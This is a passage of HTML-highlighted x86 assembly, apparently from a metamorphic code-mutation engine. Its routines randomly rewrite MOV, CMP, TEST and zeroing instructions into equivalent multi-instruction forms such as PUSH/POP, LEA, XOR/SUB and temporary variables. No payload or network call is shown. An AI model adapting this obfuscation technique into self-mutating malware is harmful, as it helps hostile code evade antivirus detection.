                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_TEST</span><span class="sc0">              </span><span class="sc1">; Then, TEST-specific</span><span class="sc0">
   </span><span class="sc5">@@Double_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Random TRUE/FALSE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_Composed</span><span class="sc0">   </span><span class="sc1">; If FALSE, make a composed op.</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">         </span><span class="sc1">; Save the operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">            </span><span class="sc1">; Allocate a temporary var.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Set MOV operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">           </span><span class="sc1">; Make OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; Restore the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                 </span><span class="sc1">; If CMP, make it direct</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_Normal_Direct</span><span class="sc0">  </span><span class="sc1">; (avoid the recursion)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; If TEST, make it direct</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_Normal_Direct</span><span class="sc0">  </span><span class="sc1">; (avoid the recursion)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">           </span><span class="sc1">; Make OP Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_Normal_Direct</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; Convert the opcode to</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; OP Reg,Mem, set the size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; of the operation in the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">   </span><span class="sc1">; opcode (8 or 32 bits),</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; copy the memory reference</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; and set the register in</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; the +7 position (where it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc1">; must be).</span><span class="sc0">

   </span><span class="sc5">@@Double_OP_Composed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save the previous value</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; here</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Set "Register usage"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_MakeComposedOPImm</span><span class="sc0">       </span><span class="sc1">; Make the composed op.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; Restore the value of this</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; flag</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; Check if we could make the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_OP_Normal</span><span class="sc0">          </span><span class="sc1">; composed operation. If</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">   </span><span class="sc1">; not, make it normal.</span><span class="sc0">

   </span><span class="sc5">@@Double_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">         </span><span class="sc1">; Decide randomly if we make a</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; normal double-OP.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get it we use 8 or 32 bits</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_OP</span><span class="sc0">             </span><span class="sc1">; If 8 bits, make a normal OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHImm</span><span class="sc0">         </span><span class="sc1">; Generate PUSH Imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">          </span><span class="sc1">; Generate a POP Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_CMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Make a normal OP if we get</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">             </span><span class="sc1">; TRUE randomly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Select the opcodes to use with</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; CMP: CMP and SUB</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_CMPTEST_Common</span><span class="sc0">
   </span><span class="sc5">@@Double_TEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Select the opcodes to use with</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; TEST: TEST and AND</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_CMPTEST_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">    </span><span class="sc1">; Save the current operation</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">       </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">            </span><span class="sc1">; Make a MOV TempVar,Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">       </span><span class="sc1">; Select randomly the opcode </span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; stored in ECX or EDX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_CMPTEST_Next</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_CMPTEST_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the size of the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; in the opcode and store it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">  </span><span class="sc1">; blah, blah, blah...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Here we have done:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; CMP/SUB/TEST/AND TempVar,Imm</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_MOV</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                 </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_CMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                 </span><span class="sc1">; XOR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_XOR</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD</span><span class="sc0">
   </span><span class="sc5">@@Single_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Construct the instruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; with the operation, size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; of operands, destiny reg.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; and immediate value.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc1">; Here we are going to make MOV Reg,Imm in a single instruction</span><span class="sc0">
   </span><span class="sc5">@@Single_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the immediate value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Is it 0?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_MOV_0</span><span class="sc0">             </span><span class="sc1">; Then, jump</span><span class="sc0">
   </span><span class="sc5">@@Single_OP_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                 </span><span class="sc1">; Select LEA making with a</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                 </span><span class="sc1">; probability of 25%</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; 8 bits operand size?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">              </span><span class="sc1">; Then, we can't use LEA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000808FCh</span><span class="sc0">         </span><span class="sc1">; Make LEA Reg,[Imm]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_MOV_0</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; Select to make LEA with 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                 </span><span class="sc1">; (or other) with a probability</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                 </span><span class="sc1">; of 25% (or normal MOV)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP_MOV</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; Prob. of 25% of making XOR</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_MOV_0_XOR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">; Prob. of 25% of making SUB</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_MOV_0_SUB</span><span class="sc0">
   </span><span class="sc5">@@Single_MOV_0_AND</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Prob. of 25% of making AND</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">               </span><span class="sc1">; AND Reg,0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_MOV_0_XOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">          </span><span class="sc1">; 1, +9 = Ah, +26h = 30h: XOR</span><span class="sc0">
   </span><span class="sc5">@@Single_MOV_0_SUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">        </span><span class="sc1">; 2, +26h = 28h: SUB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">          </span><span class="sc1">; Save the current operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; Set the new operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set source and destiny</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;  register as the same</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">            </span><span class="sc1">; Gen XOR/SUB Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single_CMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check if the immediate is 0</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">                </span><span class="sc1">; If it isn't, make it normal</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">        </span><span class="sc1">; Prob. of 25% of making CMP Reg,0</span><span class="sc0">
